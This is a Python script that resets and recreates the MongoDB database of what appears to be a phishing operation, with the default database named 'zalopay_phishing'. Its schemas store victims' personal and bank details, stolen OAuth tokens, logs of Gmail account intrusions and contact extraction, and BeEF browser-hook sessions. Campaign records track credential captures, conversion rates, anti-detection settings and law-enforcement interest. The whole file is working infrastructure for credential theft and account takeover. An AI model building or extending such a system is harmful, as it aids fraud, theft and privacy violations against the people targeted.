"""
MongoDB Schema Reset Script
Drops and recreates all collections according to database-schema-documentation
Ensures 100% consistency with documentation specifications
"""

import logging
import os
import sys
from datetime import datetime, timezone, timedelta
from pymongo import MongoClient
from pymongo.errors import PyMongoError, OperationFailure
from passlib.context import CryptContext
import secrets

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configure password hashing
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

class DatabaseSchemaReset:
    """Database schema reset and recreation manager"""

    def __init__(self, connection_string: str, database_name: str):
        self.connection_string = connection_string
        self.database_name = database_name
        self.client = None
        self.db = None

    def connect(self) -> bool:
        """Connect to MongoDB"""
        try:
            self.client = MongoClient(
                self.connection_string,
                serverSelectionTimeoutMS=5000,
                maxPoolSize=10,
                minPoolSize=2
            )

            # Test connection
            self.client.admin.command('ping')
            self.db = self.client[self.database_name]

            logger.info("Connected to MongoDB: %s", self.database_name)
            return True

        except PyMongoError as e:
            logger.error("MongoDB connection failed: %s", e)
            return False

    def drop_all_collections(self) -> bool:
        """Drop all existing collections"""
        try:
            collections = self.db.list_collection_names()
            
            if not collections:
                logger.info("No collections to drop")
                return True
            
            logger.info("Dropping %d collections: %s", len(collections), collections)
            
            for collection_name in collections:
                self.db.drop_collection(collection_name)
                logger.info("Dropped collection: %s", collection_name)
            
            logger.info("All collections dropped successfully")
            return True

        except PyMongoError as e:
            logger.error("Error dropping collections: %s", e)
            return False

    def create_victims_collection(self) -> bool:
        """Create victims collection with full validation schema"""
        try:
            # Create collection with validation
            self.db.create_collection("victims", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": [
                        "victim_id", "email", "personal_info", "status",
                        "created_at", "risk_score", "business_indicators",
                        "exploitation_history", "risk_assessment"
                    ],
                    "properties": {
                        "victim_id": {
                            "bsonType": "string",
                            "pattern": "^VIC_[0-9]{8}_[A-Z0-9]{6}$",
                            "description": "Victim ID must follow format VIC_YYYYMMDD_XXXXXX"
                        },
                        "email": {
                            "bsonType": "string",
                            "pattern": "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$"
                        },
                        "phone": {
                            "bsonType": "string",
                            "pattern": "^(\\+84|84|0)[3|5|7|8|9][0-9]{8}$",
                            "description": "Vietnamese phone number format required"
                        },
                        "personal_info": {
                            "bsonType": "object",
                            "required": ["full_name", "email"],
                            "properties": {
                                "full_name": {"bsonType": "string", "minLength": 2},
                                "email": {"bsonType": "string"},
                                "phone": {"bsonType": "string"},
                                "date_of_birth": {"bsonType": ["date", "null"]},
                                "gender": {"enum": ["male", "female", "other", "unknown"]}
                            }
                        },
                        "bank_info": {
                            "bsonType": "object",
                            "properties": {
                                "bank_name": {"bsonType": "string"},
                                "account_number": {
                                    "bsonType": "string",
                                    "pattern": "^[0-9]{8,20}$"
                                },
                                "account_holder": {"bsonType": "string"}
                            }
                        },
                        "location": {
                            "bsonType": "object",
                            "properties": {
                                "coordinates": {
                                    "bsonType": "object",
                                    "properties": {
                                        "type": {"bsonType": "string"},
                                        "coordinates": {
                                            "bsonType": "array",
                                            "items": {"bsonType": "double"}
                                        }
                                    }
                                },
                                "city": {"bsonType": "string"},
                                "country": {"bsonType": "string"},
                                "ip_address": {"bsonType": "string"}
                            }
                        },
                        "status": {
                            "bsonType": "string",
                            "enum": ["active", "inactive", "compromised", "blocked", "archived"]
                        },
                        "risk_score": {
                            "bsonType": "int",
                            "minimum": 0,
                            "maximum": 100
                        },
                        "verification_status": {
                            "bsonType": "string",
                            "enum": ["unverified", "pending", "verified", "failed"]
                        },
                        "behavior_pattern": {
                            "bsonType": "string",
                            "enum": ["careful", "normal", "aggressive", "suspicious"]
                        },
                        "device_fingerprint": {
                            "bsonType": "string",
                            "minLength": 32,
                            "maxLength": 128
                        },
                        "campaign_id": {"bsonType": "string"},
                        "business_indicators": {
                            "bsonType": "object",
                            "properties": {
                                "financial_capacity": {
                                    "bsonType": "object",
                                    "properties": {
                                        "estimated_income": {"bsonType": "double", "minimum": 0},
                                        "credit_score": {"bsonType": "int", "minimum": 300, "maximum": 850},
                                        "assets_value": {"bsonType": "double", "minimum": 0},
                                        "debt_level": {"bsonType": "double", "minimum": 0}
                                    }
                                },
                                "digital_behavior": {
                                    "bsonType": "object",
                                    "properties": {
                                        "online_banking_usage": {"bsonType": "int", "minimum": 0, "maximum": 100},
                                        "mobile_banking_frequency": {"bsonType": "int", "minimum": 0, "maximum": 100},
                                        "investment_activity": {"bsonType": "bool"},
                                        "cryptocurrency_interest": {"bsonType": "bool"}
                                    }
                                },
                                "lifestyle_indicators": {
                                    "bsonType": "object",
                                    "properties": {
                                        "travel_frequency": {"bsonType": "int", "minimum": 0, "maximum": 100},
                                        "luxury_spending": {"bsonType": "double", "minimum": 0},
                                        "entertainment_budget": {"bsonType": "double", "minimum": 0},
                                        "shopping_habits": {"bsonType": "string"}
                                    }
                                },
                                "business_value_score": {"bsonType": "double", "minimum": 0, "maximum": 100}
                            }
                        },
                        "exploitation_history": {
                            "bsonType": "array",
                            "items": {
                                "bsonType": "object",
                                "properties": {
                                    "timestamp": {"bsonType": "date"},
                                    "exploitation_type": {"bsonType": "string"},
                                    "method": {"bsonType": "string"},
                                    "success": {"bsonType": "bool"},
                                    "data_exfiltrated": {"bsonType": "double"},
                                    "financial_impact": {"bsonType": "double"},
                                    "campaign_id": {"bsonType": "string"},
                                    "notes": {"bsonType": "string"}
                                }
                            }
                        },
                        "risk_assessment": {
                            "bsonType": "object",
                            "properties": {
                                "overall_risk_level": {
                                    "bsonType": "string",
                                    "enum": ["very_low", "low", "medium", "high", "very_high", "critical"]
                                },
                                "financial_risk": {
                                    "bsonType": "double",
                                    "minimum": 0,
                                    "maximum": 100
                                },
                                "identity_risk": {
                                    "bsonType": "double",
                                    "minimum": 0,
                                    "maximum": 100
                                },
                                "behavioral_risk": {
                                    "bsonType": "double",
                                    "minimum": 0,
                                    "maximum": 100
                                },
                                "technical_risk": {
                                    "bsonType": "double",
                                    "minimum": 0,
                                    "maximum": 100
                                },
                                "risk_factors": {
                                    "bsonType": "array",
                                    "items": {"bsonType": "string"}
                                },
                                "mitigation_recommendations": {
                                    "bsonType": "array",
                                    "items": {"bsonType": "string"}
                                },
                                "last_assessment": {"bsonType": "date"},
                                "next_assessment_due": {"bsonType": "date"}
                            }
                        },
                        "created_at": {"bsonType": "date"},
                        "updated_at": {"bsonType": "date"},
                        "last_activity": {"bsonType": "date"}
                    },
                    "additionalProperties": False
                }
            })

            logger.info("Created victims collection with validation schema")
            return True

        except PyMongoError as e:
            logger.error("Error creating victims collection: %s", e)
            return False

    def create_oauth_tokens_collection(self) -> bool:
        """Create OAuth tokens collection with encryption placeholders"""
        try:
            self.db.create_collection("oauth_tokens", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["victim_id", "provider", "tokens", "token_metadata", "profile_data"],
                    "properties": {
                        "victim_id": {"bsonType": "string"},
                        "provider": {"enum": ["google", "apple", "facebook"]},
                        "tokens": {
                            "bsonType": "object",
                            "required": ["access_token", "refresh_token", "id_token", "expires_at", "scope"],
                            "properties": {
                                "access_token": {"bsonType": "string"},
                                "refresh_token": {"bsonType": "string"},
                                "id_token": {"bsonType": "string"},
                                "expires_at": {"bsonType": "date"},
                                "scope": {
                                    "bsonType": "array",
                                    "items": {"bsonType": "string"}
                                },
                                "token_type": {"bsonType": "string"}
                            }
                        },
                        "token_metadata": {
                            "bsonType": "object",
                            "required": ["issued_at", "last_refresh", "refresh_count", "status"],
                            "properties": {
                                "issued_at": {"bsonType": "date"},
                                "last_refresh": {"bsonType": "date"},
                                "refresh_count": {"bsonType": "int", "minimum": 0},
                                "status": {"enum": ["active", "expired", "revoked", "invalid"]},
                                "last_used": {"bsonType": "date"}
                            }
                        },
                        "profile_data": {
                            "bsonType": "object",
                            "required": ["email", "verified_email"],
                            "properties": {
                                "google_id": {"bsonType": "string"},
                                "verified_email": {"bsonType": "bool"},
                                "name": {"bsonType": "string"},
                                "given_name": {"bsonType": "string"},
                                "family_name": {"bsonType": "string"},
                                "picture": {"bsonType": "string"},
                                "locale": {"bsonType": "string"}
                            }
                        },
                        "created_at": {"bsonType": "date"},
                        "updated_at": {"bsonType": "date"}
                    }
                }
            })

            logger.info("Created oauth_tokens collection with validation schema")
            return True

        except PyMongoError as e:
            logger.error("Error creating oauth_tokens collection: %s", e)
            return False

    def create_admin_users_collection(self) -> bool:
        """Create admin users collection with bcrypt password hashing"""
        try:
            self.db.create_collection("admin_users", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["username", "email", "password_hash", "role", "permissions", "is_active"],
                    "properties": {
                        "username": {"bsonType": "string", "minLength": 3, "maxLength": 50},
                        "email": {
                            "bsonType": "string",
                            "pattern": "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$"
                        },
                        "password_hash": {"bsonType": "string", "minLength": 60},
                        "role": {"enum": ["super_admin", "admin", "operator", "viewer"]},
                        "permissions": {
                            "bsonType": "array",
                            "items": {"bsonType": "string"}
                        },
                        "access_restrictions": {
                            "bsonType": "object",
                            "properties": {
                                "ip_whitelist": {
                                    "bsonType": "array",
                                    "items": {"bsonType": "string"}
                                },
                                "time_restrictions": {
                                    "bsonType": "object",
                                    "properties": {
                                        "allowed_hours": {
                                            "bsonType": "array",
                                            "items": {"bsonType": "int", "minimum": 0, "maximum": 23}
                                        },
                                        "timezone": {"bsonType": "string"}
                                    }
                                },
                                "data_access_level": {"enum": ["all", "limited", "readonly"]}
                            }
                        },
                        "mfa_config": {
                            "bsonType": "object",
                            "properties": {
                                "mfa_enabled": {"bsonType": "bool"},
                                "mfa_method": {"enum": ["totp", "sms", "email"]},
                                "totp_secret": {"bsonType": "string"},
                                "backup_codes": {
                                    "bsonType": "array",
                                    "items": {"bsonType": "string"}
                                },
                                "last_mfa_reset": {"bsonType": "date"}
                            }
                        },
                        "session_config": {
                            "bsonType": "object",
                            "properties": {
                                "max_concurrent_sessions": {"bsonType": "int", "minimum": 1, "maximum": 10},
                                "session_timeout_minutes": {"bsonType": "int", "minimum": 15, "maximum": 480},
                                "idle_timeout_minutes": {"bsonType": "int", "minimum": 5, "maximum": 120},
                                "require_fresh_auth_for_sensitive": {"bsonType": "bool"}
                            }
                        },
                        "activity_summary": {
                            "bsonType": "object",
                            "properties": {
                                "last_login": {"bsonType": "date"},
                                "last_activity": {"bsonType": "date"},
                                "login_count_30d": {"bsonType": "int", "minimum": 0},
                                "failed_login_attempts_24h": {"bsonType": "int", "minimum": 0},
                                "victims_accessed_30d": {"bsonType": "int", "minimum": 0},
                                "gmail_exploitations_30d": {"bsonType": "int", "minimum": 0},
                                "data_exports_30d": {"bsonType": "int", "minimum": 0}
                            }
                        },
                        "security_flags": {
                            "bsonType": "object",
                            "properties": {
                                "account_locked": {"bsonType": "bool"},
                                "password_expired": {"bsonType": "bool"},
                                "suspicious_activity": {"bsonType": "bool"},
                                "last_password_change": {"bsonType": "date"},
                                "password_change_required": {"bsonType": "bool"}
                            }
                        },
                        "admin_metadata": {
                            "bsonType": "object",
                            "properties": {
                                "created_by": {"bsonType": "string"},
                                "department": {"bsonType": "string"},
                                "clearance_level": {"enum": ["maximum", "high", "medium", "low"]},
                                "training_completed": {
                                    "bsonType": "array",
                                    "items": {"bsonType": "string"}
                                }
                            }
                        },
                        "created_at": {"bsonType": "date"},
                        "updated_at": {"bsonType": "date"},
                        "is_active": {"bsonType": "bool"}
                    }
                }
            })

            logger.info("Created admin_users collection with validation schema")
            return True

        except PyMongoError as e:
            logger.error("Error creating admin_users collection: %s", e)
            return False

    def create_campaigns_collection(self) -> bool:
        """Create campaigns collection with comprehensive statistics tracking"""
        try:
            self.db.create_collection("campaigns", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["name", "code", "description", "config", "status", "created_at"],
                    "properties": {
                        "name": {"bsonType": "string", "minLength": 5, "maxLength": 200},
                        "code": {"bsonType": "string", "pattern": "^[A-Z0-9_]+$"},
                        "description": {"bsonType": "string", "minLength": 10},
                        "config": {
                            "bsonType": "object",
                            "required": ["target_domains", "landing_template", "authentication_methods"],
                            "properties": {
                                "target_domains": {
                                    "bsonType": "array",
                                    "items": {"bsonType": "string"}
                                },
                                "landing_template": {"bsonType": "string"},
                                "authentication_methods": {
                                    "bsonType": "array",
                                    "items": {"enum": ["google_oauth", "apple_oauth", "facebook_oauth", "manual_form"]}
                                },
                                "geographic_targeting": {
                                    "bsonType": "object",
                                    "properties": {
                                        "primary_countries": {
                                            "bsonType": "array",
                                            "items": {"bsonType": "string", "minLength": 2, "maxLength": 2}
                                        },
                                        "secondary_countries": {
                                            "bsonType": "array",
                                            "items": {"bsonType": "string", "minLength": 2, "maxLength": 2}
                                        },
                                        "exclude_countries": {
                                            "bsonType": "array",
                                            "items": {"bsonType": "string", "minLength": 2, "maxLength": 2}
                                        }
                                    }
                                },
                                "demographic_targeting": {
                                    "bsonType": "object",
                                    "properties": {
                                        "target_languages": {
                                            "bsonType": "array",
                                            "items": {"bsonType": "string"}
                                        },
                                        "business_focus": {"bsonType": "bool"},
                                        "executive_targeting": {"bsonType": "bool"},
                                        "tech_savvy_level": {"enum": ["low", "medium", "high"]}
                                    }
                                }
                            }
                        },
                        "infrastructure": {
                            "bsonType": "object",
                            "properties": {
                                "proxy_pool": {"bsonType": "string"},
                                "beef_enabled": {"bsonType": "bool"},
                                "anti_detection_level": {"enum": ["low", "medium", "high", "maximum"]},
                                "load_balancing": {"enum": ["round_robin", "least_connections", "ip_hash"]},
                                "backup_domains": {
                                    "bsonType": "array",
                                    "items": {"bsonType": "string"}
                                }
                            }
                        },
                        "timeline": {
                            "bsonType": "object",
                            "properties": {
                                "planned_start": {"bsonType": "date"},
                                "actual_start": {"bsonType": "date"},
                                "planned_end": {"bsonType": "date"},
                                "current_phase": {"enum": ["planning", "active", "paused", "completed", "cancelled"]},
                                "milestones": {
                                    "bsonType": "array",
                                    "items": {
                                        "bsonType": "object",
                                        "properties": {
                                            "name": {"bsonType": "string"},
                                            "target_date": {"bsonType": "date"},
                                            "completed": {"bsonType": "bool"}
                                        }
                                    }
                                }
                            }
                        },
                        "statistics": {
                            "bsonType": "object",
                            "properties": {
                                "total_visits": {"bsonType": "int", "minimum": 0},
                                "unique_visitors": {"bsonType": "int", "minimum": 0},
                                "credential_captures": {"bsonType": "int", "minimum": 0},
                                "successful_validations": {"bsonType": "int", "minimum": 0},
                                "high_value_targets": {"bsonType": "int", "minimum": 0},
                                "business_accounts": {"bsonType": "int", "minimum": 0},
                                "conversion_rates": {
                                    "bsonType": "object",
                                    "properties": {
                                        "visit_to_interaction": {"bsonType": "double", "minimum": 0, "maximum": 1},
                                        "interaction_to_auth_attempt": {"bsonType": "double", "minimum": 0, "maximum": 1},
                                        "auth_attempt_to_capture": {"bsonType": "double", "minimum": 0, "maximum": 1},
                                        "capture_to_validation": {"bsonType": "double", "minimum": 0, "maximum": 1},
                                        "overall_conversion": {"bsonType": "double", "minimum": 0, "maximum": 1}
                                    }
                                },
                                "performance_metrics": {
                                    "bsonType": "object",
                                    "properties": {
                                        "average_session_duration_seconds": {"bsonType": "int", "minimum": 0},
                                        "bounce_rate": {"bsonType": "double", "minimum": 0, "maximum": 1},
                                        "pages_per_session": {"bsonType": "double", "minimum": 0},
                                        "load_time_average_ms": {"bsonType": "int", "minimum": 0},
                                        "proxy_success_rate": {"bsonType": "double", "minimum": 0, "maximum": 1}
                                    }
                                },
                                "geographic_distribution": {"bsonType": "object"},
                                "hourly_performance": {
                                    "bsonType": "object",
                                    "properties": {
                                        "peak_hours": {
                                            "bsonType": "array",
                                            "items": {"bsonType": "int", "minimum": 0, "maximum": 23}
                                        },
                                        "best_conversion_hours": {
                                            "bsonType": "array",
                                            "items": {"bsonType": "int", "minimum": 0, "maximum": 23}
                                        },
                                        "worst_performance_hours": {
                                            "bsonType": "array",
                                            "items": {"bsonType": "int", "minimum": 0, "maximum": 23}
                                        }
                                    }
                                }
                            }
                        },
                        "success_criteria": {
                            "bsonType": "object",
                            "properties": {
                                "target_captures": {"bsonType": "int", "minimum": 0},
                                "target_validations": {"bsonType": "int", "minimum": 0},
                                "target_high_value": {"bsonType": "int", "minimum": 0},
                                "min_success_rate": {"bsonType": "double", "minimum": 0, "maximum": 1},
                                "max_detection_incidents": {"bsonType": "int", "minimum": 0}
                            }
                        },
                        "risk_assessment": {
                            "bsonType": "object",
                            "properties": {
                                "current_risk_level": {"enum": ["low", "medium", "high", "critical"]},
                                "detection_incidents": {"bsonType": "int", "minimum": 0},
                                "law_enforcement_interest": {"enum": ["none", "low", "medium", "high"]},
                                "technical_countermeasures": {"bsonType": "int", "minimum": 0},
                                "mitigation_actions": {
                                    "bsonType": "array",
                                    "items": {"bsonType": "string"}
                                }
                            }
                        },
                        "team": {
                            "bsonType": "object",
                            "properties": {
                                "campaign_manager": {"bsonType": "string"},
                                "technical_lead": {"bsonType": "string"},
                                "analysts": {
                                    "bsonType": "array",
                                    "items": {"bsonType": "string"}
                                },
                                "operators": {
                                    "bsonType": "array",
                                    "items": {"bsonType": "string"}
                                }
                            }
                        },
                        "status": {"enum": ["draft", "active", "paused", "completed", "cancelled"]},
                        "status_history": {
                            "bsonType": "array",
                            "items": {
                                "bsonType": "object",
                                "properties": {
                                    "status": {"bsonType": "string"},
                                    "timestamp": {"bsonType": "date"},
                                    "changed_by": {"bsonType": "string"},
                                    "reason": {"bsonType": "string"}
                                }
                            }
                        },
                        "created_at": {"bsonType": "date"},
                        "updated_at": {"bsonType": "date"},
                        "created_by": {"bsonType": "string"}
                    }
                }
            })

            logger.info("Created campaigns collection with validation schema")
            return True

        except PyMongoError as e:
            logger.error("Error creating campaigns collection: %s", e)
            return False

    def create_activity_logs_collection(self) -> bool:
        """Create activity logs collection with TTL indexes (2-year retention)"""
        try:
            self.db.create_collection("activity_logs", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["actor", "action_type", "target", "timestamp", "retention_expires"],
                    "properties": {
                        "actor": {
                            "bsonType": "object",
                            "required": ["admin_id", "username", "ip_address"],
                            "properties": {
                                "admin_id": {"bsonType": "string"},
                                "username": {"bsonType": "string"},
                                "ip_address": {"bsonType": "string"},
                                "user_agent": {"bsonType": "string"},
                                "session_id": {"bsonType": "string"}
                            }
                        },
                        "action_type": {
                            "bsonType": "string",
                            "enum": [
                                "login", "logout", "victim_access", "gmail_exploitation",
                                "beef_command", "campaign_create", "campaign_update",
                                "data_export", "admin_create", "admin_update",
                                "system_config_change", "security_event"
                            ]
                        },
                        "action_category": {
                            "bsonType": "string",
                            "enum": ["authentication", "data_access", "system_admin", "security"]
                        },
                        "target": {
                            "bsonType": "object",
                            "properties": {
                                "resource_type": {"bsonType": "string"},
                                "resource_id": {"bsonType": "string"},
                                "resource_name": {"bsonType": "string"}
                            }
                        },
                        "details": {
                            "bsonType": "object",
                            "properties": {
                                "request_method": {"bsonType": "string"},
                                "request_path": {"bsonType": "string"},
                                "response_status": {"bsonType": "int"},
                                "data_accessed": {"bsonType": "object"},
                                "changes_made": {"bsonType": "object"},
                                "error_message": {"bsonType": "string"}
                            }
                        },
                        "severity_level": {
                            "bsonType": "string",
                            "enum": ["low", "medium", "high", "critical"]
                        },
                        "timestamp": {"bsonType": "date"},
                        "retention_expires": {"bsonType": "date"}
                    }
                }
            })

            logger.info("Created activity_logs collection with validation schema")
            return True

        except PyMongoError as e:
            logger.error("Error creating activity_logs collection: %s", e)
            return False

    def create_gmail_access_logs_collection(self) -> bool:
        """Create Gmail access logs collection with intelligence analysis structure"""
        try:
            self.db.create_collection("gmail_access_logs", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["admin_id", "victim_id", "access_session", "created_at"],
                    "properties": {
                        "admin_id": {"bsonType": "string"},
                        "victim_id": {"bsonType": "string"},
                        "access_session": {
                            "bsonType": "object",
                            "required": ["session_id", "access_method", "start_time", "success"],
                            "properties": {
                                "session_id": {"bsonType": "string"},
                                "access_method": {"enum": ["oauth", "session", "direct"]},
                                "start_time": {"bsonType": "date"},
                                "end_time": {"bsonType": "date"},
                                "duration_seconds": {"bsonType": "int", "minimum": 0},
                                "success": {"bsonType": "bool"}
                            }
                        },
                        "actions_performed": {
                            "bsonType": "object",
                            "properties": {
                                "emails_accessed": {
                                    "bsonType": "object",
                                    "properties": {
                                        "total_read": {"bsonType": "int", "minimum": 0},
                                        "inbox_scanned": {"bsonType": "bool"},
                                        "sent_items_accessed": {"bsonType": "bool"},
                                        "search_queries": {
                                            "bsonType": "array",
                                            "items": {"bsonType": "string"}
                                        },
                                        "valuable_emails_identified": {"bsonType": "int", "minimum": 0},
                                        "attachments_downloaded": {"bsonType": "int", "minimum": 0}
                                    }
                                },
                                "contacts_extracted": {
                                    "bsonType": "object",
                                    "properties": {
                                        "total_contacts": {"bsonType": "int", "minimum": 0},
                                        "business_contacts": {"bsonType": "int", "minimum": 0},
                                        "personal_contacts": {"bsonType": "int", "minimum": 0},
                                        "high_value_contacts": {"bsonType": "int", "minimum": 0},
                                        "exported_formats": {
                                            "bsonType": "array",
                                            "items": {"bsonType": "string"}
                                        }
                                    }
                                },
                                "additional_data": {
                                    "bsonType": "object",
                                    "properties": {
                                        "calendar_events_accessed": {"bsonType": "int", "minimum": 0},
                                        "google_drive_files_listed": {"bsonType": "int", "minimum": 0},
                                        "labels_analyzed": {"bsonType": "bool"},
                                        "filters_examined": {"bsonType": "bool"}
                                    }
                                }
                            }
                        },
                        "operational_security": {
                            "bsonType": "object",
                            "properties": {
                                "proxy_used": {"bsonType": "string"},
                                "admin_fingerprint": {"bsonType": "string"},
                                "ip_address": {"bsonType": "string"},
                                "user_agent": {"bsonType": "string"},
                                "vpn_location": {"bsonType": "string"},
                                "traces_cleaned": {"bsonType": "bool"}
                            }
                        },
                        "intelligence_analysis": {
                            "bsonType": "object",
                            "properties": {
                                "business_intelligence": {
                                    "bsonType": "object",
                                    "properties": {
                                        "company_insights": {"bsonType": "int", "minimum": 0},
                                        "financial_documents": {"bsonType": "int", "minimum": 0},
                                        "contract_details": {"bsonType": "int", "minimum": 0},
                                        "client_relationships": {"bsonType": "int", "minimum": 0}
                                    }
                                },
                                "security_intelligence": {
                                    "bsonType": "object",
                                    "properties": {
                                        "password_patterns": {"bsonType": "int", "minimum": 0},
                                        "other_accounts_discovered": {"bsonType": "int", "minimum": 0},
                                        "security_practices_analyzed": {"bsonType": "bool"}
                                    }
                                },
                                "social_intelligence": {
                                    "bsonType": "object",
                                    "properties": {
                                        "personal_relationships": {"bsonType": "int", "minimum": 0},
                                        "family_contacts": {"bsonType": "int", "minimum": 0},
                                        "social_connections": {"bsonType": "int", "minimum": 0}
                                    }
                                },
                                "overall_intelligence_value": {"bsonType": "double", "minimum": 0, "maximum": 100}
                            }
                        },
                        "export_records": {
                            "bsonType": "array",
                            "items": {
                                "bsonType": "object",
                                "properties": {
                                    "export_type": {"bsonType": "string"},
                                    "file_path": {"bsonType": "string"},
                                    "record_count": {"bsonType": "int", "minimum": 0},
                                    "export_time": {"bsonType": "date"}
                                }
                            }
                        },
                        "created_at": {"bsonType": "date"}
                    }
                }
            })

            logger.info("Created gmail_access_logs collection with validation schema")
            return True

        except PyMongoError as e:
            logger.error("Error creating gmail_access_logs collection: %s", e)
            return False

    def create_beef_sessions_collection(self) -> bool:
        """Create BeEF sessions collection with exploitation timeline"""
        try:
            self.db.create_collection("beef_sessions", validator={
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["victim_id", "beef_session", "browser_intelligence", "created_at"],
                    "properties": {
                        "victim_id": {"bsonType": "string"},
                        "beef_session": {
                            "bsonType": "object",
                            "required": ["hook_id", "session_token", "injection_time", "status"],
                            "properties": {
                                "hook_id": {"bsonType": "string"},
                                "session_token": {"bsonType": "string"},
                                "injection_time": {"bsonType": "date"},
                                "last_seen": {"bsonType": "date"},
                                "status": {"enum": ["active", "inactive", "expired"]}
                            }
                        },
                        "browser_intelligence": {
                            "bsonType": "object",
                            "properties": {
                                "browser": {"bsonType": "string"},
                                "version": {"bsonType": "string"},
                                "os": {"bsonType": "string"},
                                "plugins": {
                                    "bsonType": "array",
                                    "items": {"bsonType": "string"}
                                },
                                "screen_resolution": {"bsonType": "string"},
                                "timezone": {"bsonType": "string"},
                                "language": {"bsonType": "string"},
                                "java_enabled": {"bsonType": "bool"},
                                "cookies_enabled": {"bsonType": "bool"},
                                "local_storage": {"bsonType": "bool"},
                                "session_storage": {"bsonType": "bool"}
                            }
                        },
                        "commands_executed": {
                            "bsonType": "array",
                            "items": {
                                "bsonType": "object",
                                "properties": {
                                    "command_id": {"bsonType": "string"},
                                    "module": {"bsonType": "string"},
                                    "parameters": {"bsonType": "object"},
                                    "executed_at": {"bsonType": "date"},
                                    "result": {
                                        "bsonType": "object",
                                        "properties": {
                                            "success": {"bsonType": "bool"},
                                            "data": {"bsonType": "object"},
                                            "error": {"bsonType": "string"}
                                        }
                                    }
                                }
                            }
                        },
                        "exploitation_timeline": {
                            "bsonType": "array",
                            "items": {
                                "bsonType": "object",
                                "properties": {
                                    "phase": {"bsonType": "string"},
                                    "start_time": {"bsonType": "date"},
                                    "end_time": {"bsonType": "date"},
                                    "commands": {
                                        "bsonType": "array",
                                        "items": {"bsonType": "string"}
                                    }
                                }
                            }
                        },
                        "intelligence_summary": {
                            "bsonType": "object",
                            "properties": {
                                "overall_success_rate": {"bsonType": "double", "minimum": 0, "maximum": 1},
                                "total_commands_executed": {"bsonType": "int", "minimum": 0},
                                "successful_commands": {"bsonType": "int", "minimum": 0},
                                "data_extracted": {"bsonType": "object"},
                                "exploitation_opportunities": {
                                    "bsonType": "array",
                                    "items": {"bsonType": "string"}
                                }
                            }
                        },
                        "expires_at": {"bsonType": "date"},
                        "created_at": {"bsonType": "date"},
                        "updated_at": {"bsonType": "date"}
                    }
                }
            })

            logger.info("Created beef_sessions collection with validation schema")
            return True

        except PyMongoError as e:
            logger.error("Error creating beef_sessions collection: %s", e)
            return False

    def create_all_collections(self) -> bool:
        """Create all collections with validation schemas"""
        try:
            collections = [
                ("victims", self.create_victims_collection),
                ("oauth_tokens", self.create_oauth_tokens_collection),
                ("admin_users", self.create_admin_users_collection),
                ("campaigns", self.create_campaigns_collection),
                ("activity_logs", self.create_activity_logs_collection),
                ("gmail_access_logs", self.create_gmail_access_logs_collection),
                ("beef_sessions", self.create_beef_sessions_collection)
            ]

            for collection_name, create_func in collections:
                logger.info("Creating collection: %s", collection_name)
                if not create_func():
                    logger.error("Failed to create collection: %s", collection_name)
                    return False

            logger.info("All collections created successfully")
            return True

        except Exception as e:
            logger.error("Error creating collections: %s", e)
            return False

    def reset_database(self) -> bool:
        """Complete database reset and recreation"""
        try:
            logger.info("Starting database schema reset...")

            # Connect to MongoDB
            if not self.connect():
                return False

            # Drop all existing collections
            if not self.drop_all_collections():
                return False

            # Create all collections with validation schemas
            if not self.create_all_collections():
                return False

            logger.info("Database schema reset completed successfully")
            return True

        except Exception as e:
            logger.error("Database schema reset failed: %s", e)
            return False
        finally:
            if self.client:
                self.client.close()

def main():
    """Main execution function"""
    # Get connection details from environment
    mongodb_connection_uri = os.getenv("MONGODB_URI", "mongodb://localhost:27017")
    database_name = os.getenv("MONGODB_DATABASE", "zalopay_phishing")

    # Initialize database reset
    db_reset = DatabaseSchemaReset(mongodb_connection_uri, database_name)
    
    # Execute reset
    success = db_reset.reset_database()
    
    if success:
        print("Database schema reset completed successfully")
        sys.exit(0)
    else:
        print("Database schema reset failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
